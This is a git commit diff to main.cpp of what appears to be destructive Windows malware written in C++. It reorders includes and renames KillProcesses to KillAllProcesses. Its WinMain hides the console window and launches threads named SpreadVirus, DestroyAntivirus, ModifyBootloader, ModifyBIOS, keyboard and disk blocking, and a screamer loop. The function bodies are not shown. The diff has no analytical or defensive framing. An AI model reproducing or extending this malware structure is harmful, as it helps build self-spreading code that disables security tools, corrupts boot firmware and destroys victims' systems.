8c9acb015d0861b073271892dc851af678f17ae3
W-A-Voron <voron.matvey2013@gmail.com>
2026-08-19 16:34:12 +0700

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -2,47 +2,45 @@
 #include <iostream>
 #include <thread>
 #include <vector>
-#include <filesystem>
-#include <fstream>
-#include <string>
 #include <random>
 #include <chrono>
+#include <filesystem>
 #include <tlhelp32.h>
 #include <shlobj.h>
 #include <shellapi.h>
+#include <fstream>
+#include <string>
 
 namespace fs = std::filesystem;
 
-// Прототипы функций
+// Прототипы
 void InitializeScareModule();
 void InitializeFileSystemModule();
 void InitializeKeyboardBlockModule();
 void SpreadVirus();
-void KillProcesses();
+void KillAllProcesses();
 void DestroyAntivirus();
 void ModifyBootloader();
 void ModifyBIOS();
 void OpenRandomAppsAndSites();
 void ScreamerLoop();
-void InitializeDiskBlockModule(); // НОВЫЙ МОДУЛЬ
+void InitializeDiskBlockModule();
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
 
     std::vector<std::thread> threads;
-
     threads.emplace_back(InitializeScareModule);
     threads.emplace_back(InitializeFileSystemModule);
     threads.emplace_back(InitializeKeyboardBlockModule);
-    threads.emplace_back(KillProcesses);
+    threads.emplace_back(KillAllProcesses);
     threads.emplace_back(DestroyAntivirus);
     threads.emplace_back(ModifyBootloader);
     threads.emplace_back(ModifyBIOS);
     threads.emplace_back(OpenRandomAppsAndSites);
     threads.emplace_back(SpreadVirus);
-    threads.emplace_back(InitializeDiskBlockModule); // ЗАПУСКАЕМ
-
+    threads.emplace_back(InitializeDiskBlockModule);
     threads.emplace_back(ScreamerLoop);
 
     for (auto& t : threads) {
